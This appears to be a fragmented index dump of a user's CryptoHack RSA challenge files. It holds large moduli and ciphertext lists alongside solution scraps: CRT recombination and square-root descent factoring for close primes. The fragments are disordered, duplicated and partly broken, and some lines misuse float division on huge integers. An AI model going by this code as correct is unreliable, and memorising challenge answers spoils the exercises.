44aabf826a0b33ad0e84280478cb202b|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|13|5|v|text
	5603386396458228314230975500760833991383866638504216400766044200173576179323437058101562931430558738148852367292802918725271632845889728711316688681080762762324367273332764959495900563756768440309595248691744845766607436966468714038018108912467618638117493367675937079141350328486149333053000366933205635396038539236203203489974033629281145427277222568989469994178084357460160310598260365030056631222346691527861696116334946201074529417984624304973747653407317290664224507485684421999527164122395674469650155851869651072847303136621932989550786722041915603539800197077294166881952724017065404825258494318993054344153
259bd0f3df528c7669197aa114c2feef|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|16|5|v|text
	12005639978012754274325188681720834222130605634919280945697102906256738419912110187245315232437501890545637047506165123606573171374281507075652554737014979927883759915891863646221205835211640845714836927373844277878562666545230876640830141637371729405545509920889968046268135809999117856968692236742804637929866632908329522087977077849045608566911654234541526643235586433065170392920102840518192803854740398478305598092197183671292154743153130012885747243219372709669879863098708318993844005566984491622761795349455404952285937152423145150066181043576492305166964448141091092142224906843816547235826717179687198833961
cd246f942102129e81c86f8a7cc48586|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|18|5|v|text
	1522280741383024774933280198410525846833410931417064479278161088248621390305797210285777845359812715909342595804742710152832168365433905718629465545306028275498667935929180318276445229415104842407145880223983428713335709038026249381363564625791656631137936935477777236936508600353416079028339774876425198789629900265348122040413865209592074731028757972968635601695468594123523892918747882221891834598896483393711851510479989203644477972694520237262271530260496342247355761992646827057846109181410462131875377404309983072358313960427035348425800940661373272947647516867525052504539561289941374722179778872627956360577
3f6a2d521a8c6dd3269b584a69d209ba|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|21|5|v|text
	17795451956221451086587651307408104001363221003775928432650752466563818944480119932209305765249625841644339021308118433529490162294175590972336954199870002456682453215153111182451526643055812311071588382409549045943806869173323058059908678022558101041630272658592291327387549001621625757585079662873501990182250368909302040015518454068699267914137675644695523752851229148887052774845777699287718342916530122031495267122700912518207571821367123013164125109174399486158717604851125244356586369921144640969262427220828940652994276084225196272504355264547588369516271460361233556643313911651916709471353368924621122725823
fe603adeea43f38490e4a627dc62cd15|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|23|5|v|text
	8752507806125480063647081749506966428026005464325535765874589376572431101816084498482064083887400646438977437273700004934257274516197148448425455243811009944321764771392044345410680448204581679548854193081394891841223548418812679441816502910830861271884276608891963388657558218620911858230760629700918375750796354647493524576614017731938584618983084762612414591830024113057983483156974095503392359946722756364412399187910604029583464521617256125933111786441852765229820406911991809039519015434793656710199153380699319611499255869045311421603167606551250174746275803467549814529124250122560661739949229005127507540805
0fc777efe06b7b2f37f6dca0dbff207e|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|26|5|v|text
	25252721057733555082592677470459355315816761410478159901637469821096129654501579313856822193168570733800370301193041607236223065376987811309968760580864569059669890823406084313841678888031103461972888346942160731039637326224716901940943571445217827960353637825523862324133203094843228068077462983941899571736153227764822122334838436875488289162659100652956252427378476004164698656662333892963348126931771536472674447932268282205545229907715893139346941832367885319597198474180888087658441880346681594927881517150425610145518942545293750127300041942766820911120196262215703079164895767115681864075574707999253396530263
2de40b484e71811d2b89fcc7c76d23b7|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|28|5|v|text
	23399624135645767243362438536844425089018405258626828336566973656156553220156563508607371562416462491581383453279478716239823054532476006642583363934314982675152824147243749715830794488268846671670287617324522740126594148159945137948643597981681529145611463534109482209520448640622103718682323158039797577387254265854218727476928164074249568031493984825273382959147078839665114417896463735635546290504843957780546550577300001452747760982468547756427137284830133305010038339400230477403836856663883956463830571934657200851598986174177386323915542033293658596818231793744261192870485152396793393026198817787033127061749
c62f00a037fbd6998c73d67178642b77|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|31|5|v|text
	19833203629283018227011925157509157967003736370320129764863076831617271290326613531892600790037451229326924414757856123643351635022817441101879725227161178559229328259469472961665857650693413215087493448372860837806619850188734619829580286541292997729705909899738951228555834773273676515143550091710004139734080727392121405772911510746025807070635102249154615454505080376920778703360178295901552323611120184737429513669167641846902598281621408629883487079110172218735807477275590367110861255756289520114719860000347219161944020067099398239199863252349401303744451903546571864062825485984573414652422054433066179558897
43af4962ad69a61536d44c7b812636d0|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|33|5|v|text
	15239683995712538665992887055453717247160229941400011601942125542239446512492703769284448009141905335544729440961349343533346436084176947090230267995060908954209742736573986319254695570265339469489948102562072983996668361864286444602534666284339466797477805372109723178841788198177337648499899079471221924276590042183382182326518312979109378616306364363630519677884849945606288881683625944365927809405420540525867173639222696027472336981838588256771671910217553150588878434061862840893045763456457939944572192848992333115479951110622066173007227047527992906364658618631373790704267650950755276227747600169403361509144
09d0daa0c55322eb06a6fec2266f6599|file:///home/neo/cryptohack/general/mathematics2/adrien.py|3|1|V|python
	import sys,binascii
	sys.path.insert(1, '~/cryptohack')
	from general.mathematics.mathematics import *
1e4f1ce631196debbe0f996148763025|file:///home/neo/cryptohack/rsa/exponent/johan.py|24|1|V|python
	pt = 29267021623892092810434649307487975691337102919080194697704762566728554852220559568507472279993352638143691741033722897927209400489699307748716662280196163436275084277050257175200200980551502072330988778691512453204264935987485432225042886117301672816502258438951220231487317441512431181669350646045029706094086165195124333252663729739846304407693870484392985350868891633462177030849277842127802344965757014164737127445268722420232049673536714447953886145320426012304208445586020253958369024246577115617300462192693750117301724502306502018789346207413021878504210733092174198572793974559653485387346372245457251870627526015698316957834751607726987619680649650338005540949664957783676607747648278347047954743558329487272085750044314252951613327637350560855252945782487236298621500573749699317546809781916405260647100711033181175062336386713029023698269111826207090737522638720471383563753311705215058492621142543178707747007891140539462604925687996083824872784128635019912256770895156600880510984027572359284444527014574955254100891746217643981840224245243058807331272177265402236649509956886387801487955064837170404497559398780203702132935366209171570341643046210848180024362050574993845311231706048154139240161052742316355201066386586622170354078848070481146333921901476335724592173341357585045290682104762446320880613160424950306114407595217834469659194613340279120251051029572478012509641437898971054726829242313986491974900532989171913162502500427608684020393573363684674657963007623844153717746241277685281411567080960125882209621867699032271861060065075852191271667638933865586045697213295562005386107221527622973902672909891437684795282653907343569125803129616197410623858063082970969164435905753848962824440060871244723165578485027874934721675959013507723840200778491812481862427125909260438713355284051961231081946339331999014586178556740094913195088112582715011312367429908696549261348196459686755769572384573991715004012259118641396080523332257741449213305222239571414090476898883148678033318343331839628644888014048450681138711319302373644278643607883441562946728182433054032147978754351961908163475817175949457606907575082202567688190231240398363517337538712453860171017940484056940733580396070731271850283746570829264333991483902495758999188675221622941337476255710831601208006563541994889347034009267284003797056374936498404584824908801681332458224687920945230578739135366220935424814212185098689849829123549205574748465196472817264484045678644062363271843169152650234561627140509789098413377561111251671657557174225295380757293404790908195282728078433645004682192460028817011564976071781620330489452921156574479905013285955994352565074190009263972846609636556111654926884569676429050961709798603494397605822757085873105412036169246417237605494967552496026056430609433165854233516505635955223058299439262529078527275074
e336c8c0692d9b630e2ab98080fb4068|file:///home/neo/cryptohack/rsa/exponent/johan.py|9|1|V|python
	n = [14528915758150659907677315938876872514853653132820394367681510019000469589767908107293777996420037715293478868775354645306536953789897501630398061779084810058931494642860729799059325051840331449914529594113593835549493208246333437945551639983056810855435396444978249093419290651847764073607607794045076386643023306458718171574989185213684263628336385268818202054811378810216623440644076846464902798568705083282619513191855087399010760232112434412274701034094429954231366422968991322244343038458681255035356984900384509158858007713047428143658924970374944616430311056440919114824023838380098825914755712289724493770021, 20463913454649855046677206889944639231694511458416906994298079596685813354570085475890888433776403011296145408951323816323011550738170573801417972453504044678801608709931200059967157605416809387753258251914788761202456830940944486915292626560515250805017229876565916349963923702612584484875113691057716315466239062005206014542088484387389725058070917118549621598629964819596412564094627030747720659155558690124005400257685883230881015636066183743516494701900125788836869358634031031172536767950943858472257519195392986989232477630794600444813136409000056443035171453870906346401936687214432176829528484662373633624123, 19402640770593345339726386104915705450969517850985511418263141255686982818547710008822417349818201858549321868878490314025136645036980129976820137486252202687238348587398336652955435182090722844668488842986318211649569593089444781595159045372322540131250208258093613844753021272389255069398553523848975530563989367082896404719544411946864594527708058887475595056033713361893808330341623804367785721774271084389159493974946320359512776328984487126583015777989991635428744050868653379191842998345721260216953918203248167079072442948732000084754225272238189439501737066178901505257566388862947536332343196537495085729147, 12005639978012754274325188681720834222130605634919280945697102906256738419912110187245315232437501890545637047506165123606573171374281507075652554737014979927883759915891863646221205835211640845714836927373844277878562666545230876640830141637371729405545509920889968046268135809999117856968692236742804637929866632908329522087977077849045608566911654234541526643235586433065170392920102840518192803854740398478305598092197183671292154743153130012885747243219372709669879863098708318993844005566984491622761795349455404952285937152423145150066181043576492305166964448141091092142224906843816547235826717179687198833961, 17795451956221451086587651307408104001363221003775928432650752466563818944480119932209305765249625841644339021308118433529490162294175590972336954199870002456682453215153111182451526643055812311071588382409549045943806869173323058059908678022558101041630272658592291327387549001621625757585079662873501990182250368909302040015518454068699267914137675644695523752851229148887052774845777699287718342916530122031495267122700912518207571821367123013164125109174399486158717604851125244356586369921144640969262427220828940652994276084225196272504355264547588369516271460361233556643313911651916709471353368924621122725823, 25252721057733555082592677470459355315816761410478159901637469821096129654501579313856822193168570733800370301193041607236223065376987811309968760580864569059669890823406084313841678888031103461972888346942160731039637326224716901940943571445217827960353637825523862324133203094843228068077462983941899571736153227764822122334838436875488289162659100652956252427378476004164698656662333892963348126931771536472674447932268282205545229907715893139346941832367885319597198474180888087658441880346681594927881517150425610145518942545293750127300041942766820911120196262215703079164895767115681864075574707999253396530263, 19833203629283018227011925157509157967003736370320129764863076831617271290326613531892600790037451229326924414757856123643351635022817441101879725227161178559229328259469472961665857650693413215087493448372860837806619850188734619829580286541292997729705909899738951228555834773273676515143550091710004139734080727392121405772911510746025807070635102249154615454505080376920778703360178295901552323611120184737429513669167641846902598281621408629883487079110172218735807477275590367110861255756289520114719860000347219161944020067099398239199863252349401303744451903546571864062825485984573414652422054433066179558897] 
	c = [6965891612987861726975066977377253961837139691220763821370036576350605576485706330714192837336331493653283305241193883593410988132245791554283874785871849223291134571366093850082919285063130119121338290718389659761443563666214229749009468327825320914097376664888912663806925746474243439550004354390822079954583102082178617110721589392875875474288168921403550415531707419931040583019529612270482482718035497554779733578411057633524971870399893851589345476307695799567919550426417015815455141863703835142223300228230547255523815097431420381177861163863791690147876158039619438793849367921927840731088518955045807722225, 5109363605089618816120178319361171115590171352048506021650539639521356666986308721062843132905170261025772850941702085683855336653472949146012700116070022531926476625467538166881085235022484711752960666438445574269179358850309578627747024264968893862296953506803423930414569834210215223172069261612934281834174103316403670168299182121939323001232617718327977313659290755318972603958579000300780685344728301503641583806648227416781898538367971983562236770576174308965929275267929379934367736694110684569576575266348020800723535121638175505282145714117112442582416208209171027273743686645470434557028336357172288865172, 5603386396458228314230975500760833991383866638504216400766044200173576179323437058101562931430558738148852367292802918725271632845889728711316688681080762762324367273332764959495900563756768440309595248691744845766607436966468714038018108912467618638117493367675937079141350328486149333053000366933205635396038539236203203489974033629281145427277222568989469994178084357460160310598260365030056631222346691527861696116334946201074529417984624304973747653407317290664224507485684421999527164122395674469650155851869651072847303136621932989550786722041915603539800197077294166881952724017065404825258494318993054344153, 1522280741383024774933280198410525846833410931417064479278161088248621390305797210285777845359812715909342595804742710152832168365433905718629465545306028275498667935929180318276445229415104842407145880223983428713335709038026249381363564625791656631137936935477777236936508600353416079028339774876425198789629900265348122040413865209592074731028757972968635601695468594123523892918747882221891834598896483393711851510479989203644477972694520237262271530260496342247355761992646827057846109181410462131875377404309983072358313960427035348425800940661373272947647516867525052504539561289941374722179778872627956360577, 8752507806125480063647081749506966428026005464325535765874589376572431101816084498482064083887400646438977437273700004934257274516197148448425455243811009944321764771392044345410680448204581679548854193081394891841223548418812679441816502910830861271884276608891963388657558218620911858230760629700918375750796354647493524576614017731938584618983084762612414591830024113057983483156974095503392359946722756364412399187910604029583464521617256125933111786441852765229820406911991809039519015434793656710199153380699319611499255869045311421603167606551250174746275803467549814529124250122560661739949229005127507540805, 23399624135645767243362438536844425089018405258626828336566973656156553220156563508607371562416462491581383453279478716239823054532476006642583363934314982675152824147243749715830794488268846671670287617324522740126594148159945137948643597981681529145611463534109482209520448640622103718682323158039797577387254265854218727476928164074249568031493984825273382959147078839665114417896463735635546290504843957780546550577300001452747760982468547756427137284830133305010038339400230477403836856663883956463830571934657200851598986174177386323915542033293658596818231793744261192870485152396793393026198817787033127061749, 15239683995712538665992887055453717247160229941400011601942125542239446512492703769284448009141905335544729440961349343533346436084176947090230267995060908954209742736573986319254695570265339469489948102562072983996668361864286444602534666284339466797477805372109723178841788198177337648499899079471221924276590042183382182326518312979109378616306364363630519677884849945606288881683625944365927809405420540525867173639222696027472336981838588256771671910217553150588878434061862840893045763456457939944572192848992333115479951110622066173007227047527992906364658618631373790704267650950755276227747600169403361509144]
888bd3dad4ca8152f598b827f78e00dc|file:///home/neo/cryptohack/rsa/exponent/johan.sage|2|1861|v|python
	, 12005639978012754274325188681720834222130605634919280945697102906256738419912110187245315232437501890545637047506165123606573171374281507075652554737014979927883759915891863646221205835211640845714836927373844277878562666545230876640830141637371729405545509920889968046268135809999117856968692236742804637929866632908329522087977077849045608566911654234541526643235586433065170392920102840518192803854740398478305598092197183671292154743153130012885747243219372709669879863098708318993844005566984491622761795349455404952285937152423145150066181043576492305166964448141091092142224906843816547235826717179687198833961, 17795451956221451086587651307408104001363221003775928432650752466563818944480119932209305765249625841644339021308118433529490162294175590972336954199870002456682453215153111182451526643055812311071588382409549045943806869173323058059908678022558101041630272658592291327387549001621625757585079662873501990182250368909302040015518454068699267914137675644695523752851229148887052774845777699287718342916530122031495267122700912518207571821367123013164125109174399486158717604851125244356586369921144640969262427220828940652994276084225196272504355264547588369516271460361233556643313911651916709471353368924621122725823, 25252721057733555082592677470459355315816761410478159901637469821096129654501579313856822193168570733800370301193041607236223065376987811309968760580864569059669890823406084313841678888031103461972888346942160731039637326224716901940943571445217827960353637825523862324133203094843228068077462983941899571736153227764822122334838436875488289162659100652956252427378476004164698656662333892963348126931771536472674447932268282205545229907715893139346941832367885319597198474180888087658441880346681594927881517150425610145518942545293750127300041942766820911120196262215703079164895767115681864075574707999253396530263, 19833203629283018227011925157509157967003736370320129764863076831617271290326613531892600790037451229326924414757856123643351635022817441101879725227161178559229328259469472961665857650693413215087493448372860837806619850188734619829580286541292997729705909899738951228555834773273676515143550091710004139734080727392121405772911510746025807070635102249154615454505080376920778703360178295901552323611120184737429513669167641846902598281621408629883487079110172218735807477275590367110861255756289520114719860000347219161944020067099398239199863252349401303744451903546571864062825485984573414652422054433066179558897
f9148fe9a08bea1bf1a85e2ee7214cff|file:///home/neo/cryptohack/rsa/exponent/johan.sage|3|1859|v|python
	
ad5a249343db66d92e23b6d38252c4bb|file:///home/neo/cryptohack/rsa/exponent/johan.py|23|1|V|python
	print(x)
e75de45bf5455293fd51c88672b3c8a5|file:///home/neo/cryptohack/rsa/exponent/johan.sage|2|1|V|python
	n = [14528915758150659907677315938876872514853653132820394367681510019000469589767908107293777996420037715293478868775354645306536953789897501630398061779084810058931494642860729799059325051840331449914529594113593835549493208246333437945551639983056810855435396444978249093419290651847764073607607794045076386643023306458718171574989185213684263628336385268818202054811378810216623440644076846464902798568705083282619513191855087399010760232112434412274701034094429954231366422968991322244343038458681255035356984900384509158858007713047428143658924970374944616430311056440919114824023838380098825914755712289724493770021, 20463913454649855046677206889944639231694511458416906994298079596685813354570085475890888433776403011296145408951323816323011550738170573801417972453504044678801608709931200059967157605416809387753258251914788761202456830940944486915292626560515250805017229876565916349963923702612584484875113691057716315466239062005206014542088484387389725058070917118549621598629964819596412564094627030747720659155558690124005400257685883230881015636066183743516494701900125788836869358634031031172536767950943858472257519195392986989232477630794600444813136409000056443035171453870906346401936687214432176829528484662373633624123, 19402640770593345339726386104915705450969517850985511418263141255686982818547710008822417349818201858549321868878490314025136645036980129976820137486252202687238348587398336652955435182090722844668488842986318211649569593089444781595159045372322540131250208258093613844753021272389255069398553523848975530563989367082896404719544411946864594527708058887475595056033713361893808330341623804367785721774271084389159493974946320359512776328984487126583015777989991635428744050868653379191842998345721260216953918203248167079072442948732000084754225272238189439501737066178901505257566388862947536332343196537495085729147, 12005639978012754274325188681720834222130605634919280945697102906256738419912110187245315232437501890545637047506165123606573171374281507075652554737014979927883759915891863646221205835211640845714836927373844277878562666545230876640830141637371729405545509920889968046268135809999117856968692236742804637929866632908329522087977077849045608566911654234541526643235586433065170392920102840518192803854740398478305598092197183671292154743153130012885747243219372709669879863098708318993844005566984491622761795349455404952285937152423145150066181043576492305166964448141091092142224906843816547235826717179687198833961, 17795451956221451086587651307408104001363221003775928432650752466563818944480119932209305765249625841644339021308118433529490162294175590972336954199870002456682453215153111182451526643055812311071588382409549045943806869173323058059908678022558101041630272658592291327387549001621625757585079662873501990182250368909302040015518454068699267914137675644695523752851229148887052774845777699287718342916530122031495267122700912518207571821367123013164125109174399486158717604851125244356586369921144640969262427220828940652994276084225196272504355264547588369516271460361233556643313911651916709471353368924621122725823, 25252721057733555082592677470459355315816761410478159901637469821096129654501579313856822193168570733800370301193041607236223065376987811309968760580864569059669890823406084313841678888031103461972888346942160731039637326224716901940943571445217827960353637825523862324133203094843228068077462983941899571736153227764822122334838436875488289162659100652956252427378476004164698656662333892963348126931771536472674447932268282205545229907715893139346941832367885319597198474180888087658441880346681594927881517150425610145518942545293750127300041942766820911120196262215703079164895767115681864075574707999253396530263, 19833203629283018227011925157509157967003736370320129764863076831617271290326613531892600790037451229326924414757856123643351635022817441101879725227161178559229328259469472961665857650693413215087493448372860837806619850188734619829580286541292997729705909899738951228555834773273676515143550091710004139734080727392121405772911510746025807070635102249154615454505080376920778703360178295901552323611120184737429513669167641846902598281621408629883487079110172218735807477275590367110861255756289520114719860000347219161944020067099398239199863252349401303744451903546571864062825485984573414652422054433066179558897] 
4b4c416dc7472f880f47bfc0816f08c2|file:///home/neo/cryptohack/rsa/exponent/johan.sage|2|1|V|python
	c = [6965891612987861726975066977377253961837139691220763821370036576350605576485706330714192837336331493653283305241193883593410988132245791554283874785871849223291134571366093850082919285063130119121338290718389659761443563666214229749009468327825320914097376664888912663806925746474243439550004354390822079954583102082178617110721589392875875474288168921403550415531707419931040583019529612270482482718035497554779733578411057633524971870399893851589345476307695799567919550426417015815455141863703835142223300228230547255523815097431420381177861163863791690147876158039619438793849367921927840731088518955045807722225, 5109363605089618816120178319361171115590171352048506021650539639521356666986308721062843132905170261025772850941702085683855336653472949146012700116070022531926476625467538166881085235022484711752960666438445574269179358850309578627747024264968893862296953506803423930414569834210215223172069261612934281834174103316403670168299182121939323001232617718327977313659290755318972603958579000300780685344728301503641583806648227416781898538367971983562236770576174308965929275267929379934367736694110684569576575266348020800723535121638175505282145714117112442582416208209171027273743686645470434557028336357172288865172, 5603386396458228314230975500760833991383866638504216400766044200173576179323437058101562931430558738148852367292802918725271632845889728711316688681080762762324367273332764959495900563756768440309595248691744845766607436966468714038018108912467618638117493367675937079141350328486149333053000366933205635396038539236203203489974033629281145427277222568989469994178084357460160310598260365030056631222346691527861696116334946201074529417984624304973747653407317290664224507485684421999527164122395674469650155851869651072847303136621932989550786722041915603539800197077294166881952724017065404825258494318993054344153, 1522280741383024774933280198410525846833410931417064479278161088248621390305797210285777845359812715909342595804742710152832168365433905718629465545306028275498667935929180318276445229415104842407145880223983428713335709038026249381363564625791656631137936935477777236936508600353416079028339774876425198789629900265348122040413865209592074731028757972968635601695468594123523892918747882221891834598896483393711851510479989203644477972694520237262271530260496342247355761992646827057846109181410462131875377404309983072358313960427035348425800940661373272947647516867525052504539561289941374722179778872627956360577, 8752507806125480063647081749506966428026005464325535765874589376572431101816084498482064083887400646438977437273700004934257274516197148448425455243811009944321764771392044345410680448204581679548854193081394891841223548418812679441816502910830861271884276608891963388657558218620911858230760629700918375750796354647493524576614017731938584618983084762612414591830024113057983483156974095503392359946722756364412399187910604029583464521617256125933111786441852765229820406911991809039519015434793656710199153380699319611499255869045311421603167606551250174746275803467549814529124250122560661739949229005127507540805, 23399624135645767243362438536844425089018405258626828336566973656156553220156563508607371562416462491581383453279478716239823054532476006642583363934314982675152824147243749715830794488268846671670287617324522740126594148159945137948643597981681529145611463534109482209520448640622103718682323158039797577387254265854218727476928164074249568031493984825273382959147078839665114417896463735635546290504843957780546550577300001452747760982468547756427137284830133305010038339400230477403836856663883956463830571934657200851598986174177386323915542033293658596818231793744261192870485152396793393026198817787033127061749, 15239683995712538665992887055453717247160229941400011601942125542239446512492703769284448009141905335544729440961349343533346436084176947090230267995060908954209742736573986319254695570265339469489948102562072983996668361864286444602534666284339466797477805372109723178841788198177337648499899079471221924276590042183382182326518312979109378616306364363630519677884849945606288881683625944365927809405420540525867173639222696027472336981838588256771671910217553150588878434061862840893045763456457939944572192848992333115479951110622066173007227047527992906364658618631373790704267650950755276227747600169403361509144]
2a76bbc41e241a0581454840e56a0a93|file:///home/neo/cryptohack/rsa/exponent/johan.sage|41|1|V|python
	x = crt(c, n)
f3ff385bdc0296181183c95413523622|file:///home/neo/cryptohack/rsa/prime2/output_14f82a67efe7b7edffb810dbb7ab5f27.txt|1|1|V|text
	n = 383347712330877040452238619329524841763392526146840572232926924642094891453979246383798913394114305368360426867021623649667024217266529000859703542590316063318592391925062014229671423777796679798747131250552455356061834719512365575593221216339005132464338847195248627639623487124025890693416305788160905762011825079336880567461033322240015771102929696350161937950387427696385850443727777996483584464610046380722736790790188061964311222153985614287276995741553706506834906746892708903948496564047090014307484054609862129530262108669567834726352078060081889712109412073731026030466300060341737504223822014714056413752165841749368159510588178604096191956750941078391415634472219765129561622344109769892244712668402761549412177892054051266761597330660545704317210567759828757156904778495608968785747998059857467440128156068391746919684258227682866083662345263659558066864109212457286114506228470930775092735385388316268663664139056183180238043386636254075940621543717531670995823417070666005930452836389812129462051771646048498397195157405386923446893886593048680984896989809135802276892911038588008701926729269812453226891776546037663583893625479252643042517196958990266376741676514631089466493864064316127648074609662749196545969926051
	e = 65537
	c = 98280456757136766244944891987028935843441533415613592591358482906016439563076150526116369842213103333480506705993633901994107281890187248495507270868621384652207697607019899166492132408348789252555196428608661320671877412710489782358282011364127799563335562917707783563681920786994453004763755404510541574502176243896756839917991848428091594919111448023948527766368304503100650379914153058191140072528095898576018893829830104362124927140555107994114143042266758709328068902664037870075742542194318059191313468675939426810988239079424823495317464035252325521917592045198152643533223015952702649249494753395100973534541766285551891859649320371178562200252228779395393974169736998523394598517174182142007480526603025578004665936854657294541338697513521007818552254811797566860763442604365744596444735991732790926343720102293453429936734206246109968817158815749927063561835274636195149702317415680401987150336994583752062565237605953153790371155918439941193401473271753038180560129784192800351649724465553733201451581525173536731674524145027931923204961274369826379325051601238308635192540223484055096203293400419816024111797903442864181965959247745006822690967920957905188441550106930799896292835287867403979631824085790047851383294389
f788256e055a3d815678777199ab025b|file:///home/neo/cryptohack/rsa/prime2/descent.py|8|5|v|python
	
887c6eb3019853a72236a123b8d6152e|file:///home/neo/cryptohack/rsa/prime2/descent.py|8|1|V|python
	n = 383347712330877040452238619329524841763392526146840572232926924642094891453979246383798913394114305368360426867021623649667024217266529000859703542590316063318592391925062014229671423777796679798747131250552455356061834719512365575593221216339005132464338847195248627639623487124025890693416305788160905762011825079336880567461033322240015771102929696350161937950387427696385850443727777996483584464610046380722736790790188061964311222153985614287276995741553706506834906746892708903948496564047090014307484054609862129530262108669567834726352078060081889712109412073731026030466300060341737504223822014714056413752165841749368159510588178604096191956750941078391415634472219765129561622344109769892244712668402761549412177892054051266761597330660545704317210567759828757156904778495608968785747998059857467440128156068391746919684258227682866083662345263659558066864109212457286114506228470930775092735385388316268663664139056183180238043386636254075940621543717531670995823417070666005930452836389812129462051771646048498397195157405386923446893886593048680984896989809135802276892911038588008701926729269812453226891776546037663583893625479252643042517196958990266376741676514631089466493864064316127648074609662749196545969926051
6298900a85640eb33b69e886b5d642f3|file:///home/neo/cryptohack/rsa/prime2/descent.py|23|1|V|python
	p = int(sqrt(n))
bd88e2595a16ab66c4a8ce8c4623d5aa|file:///home/neo/cryptohack/rsa/prime2/descent.py|23|1|V|python
	while n % p != 0:
75485dfde7c0eeeab0a3036d19cf4fe6|file:///home/neo/cryptohack/rsa/prime2/descent.py|23|5|V|python
	    p -= 1
a71eef68bed87a07eed0979444a83333|file:///home/neo/cryptohack/rsa/prime2/descent.py|23|1|V|python
	print(p, n//p)
13b236f2c8ef379172884fa7ff83c741|file:///home/neo/cryptohack/rsa/prime2/descent.sage|5|1|V|python
	while n % p != 0:
	    p -= 1
ee583e66f2f3d986777c003a11b915e4|file:///home/neo/cryptohack/rsa/prime2/descent.py|24|1|V|python
	dif = 2
1f9f985218d8bee05b51187d62e19fb4|file:///home/neo/cryptohack/rsa/prime2/descent.py|24|1|V|python
	x = n + pow(dif/2, 2)
d3e56a81ba3e99ed9271a192bb55a933|file:///home/neo/cryptohack/rsa/prime2/descent.sage|12|1|V|python
	# print(p, n//p)
9b33703424023ae59b2c83c7cc9d2991|file:///home/neo/cryptohack/rsa/prime2/output_f194012343666ced1a6699d196c8adc5.txt|1|1|V|text
	n: 658416274830184544125027519921443515789888264156074733099244040126213682497714032798116399288176502462829255784525977722903018714434309698108208388664768262754316426220651576623731617882923164117579624827261244506084274371250277849351631679441171018418018498039996472549893150577189302871520311715179730714312181456245097848491669795997289830612988058523968384808822828370900198489249243399165125219244753790779764466236965135793576516193213175061401667388622228362042717054014679032953441034021506856017081062617572351195418505899388715709795992029559042119783423597324707100694064675909238717573058764118893225111602703838080618565401139902143069901117174204252871948846864436771808616432457102844534843857198735242005309073939051433790946726672234643259349535186268571629077937597838801337973092285608744209951533199868228040004432132597073390363357892379997655878857696334892216345070227646749851381208554044940444182864026513709449823489593439017366358869648168238735087593808344484365136284219725233811605331815007424582890821887260682886632543613109252862114326372077785369292570900594814481097443781269562647303671428895764224084402259605109600363098950091998891375812839523613295667253813978434879172781217285652895469194181218343078754501694746598738215243769747956572555989594598180639098344891175879455994652382137038240166358066403475457 
	e: 65537
	c: 400280463088930432319280359115194977582517363610532464295210669530407870753439127455401384569705425621445943992963380983084917385428631223046908837804126399345875252917090184158440305503817193246288672986488987883177380307377025079266030262650932575205141853413302558460364242355531272967481409414783634558791175827816540767545944534238189079030192843288596934979693517964655661507346729751987928147021620165009965051933278913952899114253301044747587310830419190623282578931589587504555005361571572561916866063458812965314474160499067525067495140150092119620928363007467390920130717521169105167963364154636472055084012592138570354390246779276003156184676298710746583104700516466091034510765027167956117869051938116457370384737440965109619578227422049806566060571831017610877072484262724789571076529586427405780121096546942812322324807145137017942266863534989082115189065560011841150908380937354301243153206428896320576609904361937035263985348984794208198892615898907005955403529470847124269512316191753950203794578656029324506688293446571598506042198219080325747328636232040936761788558421528960279832802127562115852304946867628316502959562274485483867481731149338209009753229463924855930103271197831370982488703456463385914801246828662212622006947380115549529820197355738525329885232170215757585685484402344437894981555179129287164971002033759724456
1bbdbc8b9456d7255afd79df68555826|file:///home/neo/cryptohack/rsa/prime2/marin.py|7|1|V|python
	n = 658416274830184544125027519921443515789888264156074733099244040126213682497714032798116399288176502462829255784525977722903018714434309698108208388664768262754316426220651576623731617882923164117579624827261244506084274371250277849351631679441171018418018498039996472549893150577189302871520311715179730714312181456245097848491669795997289830612988058523968384808822828370900198489249243399165125219244753790779764466236965135793576516193213175061401667388622228362042717054014679032953441034021506856017081062617572351195418505899388715709795992029559042119783423597324707100694064675909238717573058764118893225111602703838080618565401139902143069901117174204252871948846864436771808616432457102844534843857198735242005309073939051433790946726672234643259349535186268571629077937597838801337973092285608744209951533199868228040004432132597073390363357892379997655878857696334892216345070227646749851381208554044940444182864026513709449823489593439017366358869648168238735087593808344484365136284219725233811605331815007424582890821887260682886632543613109252862114326372077785369292570900594814481097443781269562647303671428895764224084402259605109600363098950091998891375812839523613295667253813978434879172781217285652895469194181218343078754501694746598738215243769747956572555989594598180639098344891175879455994652382137038240166358066403475457 
41e47ed06007150d95c68d4a5c672916|file:///home/neo/cryptohack/rsa/prime2/marin.py|21|1|V|python
	q = 658416274830184544125027519921443515789888264156074733099244040126213682497714032798116399288176502462829255784525977722903018714434309698108208388664768262754316426220651576623731617882923164117579624827261244506084274371250277849351631679441171018418018498039996472549893150577189302871520311715179730714312181456245097848491669795997289830612988058523968384808822828370900198489249243399165125219244753790779764466236965135793576516193213175061401667388622228362042717054014679032953441034021506856017081062617572351195418505899388715709795992029559042119783423597324707100694064675909238717573058764118893225111602703838080618565401139902143069901117174204252871948846864436771808616432457102844534843857198735242005309073939051433790946726672234643259349535186268571629077937597838801337973092285608744209951533199868228040004432132597073390363357892379997655878857696334892216345070227646749851381208554044940444182864026513709449823489593439017366358869648168238735087593808344484365136284219725233811605331815007424582890821887260682886632543613109252862114326372077785369292570900594814481097443781269562647303671428895764224084402259605109600363098950091998891375812839523613295667253813978434879172781217285652895469194181218343078754501694746598738215243769747956572555989594598180639098344891175879455994652382137038240166358066403475457/1475979915214180235084898622737381736312066145333169775147771216478570297878078949377407337049389289382748507531496480477281264838760259191814463365330269540496961201113430156902396093989090226259326935025281409614983499388222831448598601834318536230923772641390209490231836446899608210795482963763094236630945410832793769905399982457186322944729636418890623372171723742105636440368218459649632948538696905872650486914434637457507280441823676813517852099348660847172579408422316678097670224011990280170474894487426924742108823536808485072502240519452587542875349976558572670229633962575212637477897785501552646522609988869914013540483809865681250419497686697771008
49d3fcc9a2b2310a8d0bfbf1df834b30|file:///home/neo/cryptohack/rsa/prime2/marin.py|20|1|V|python
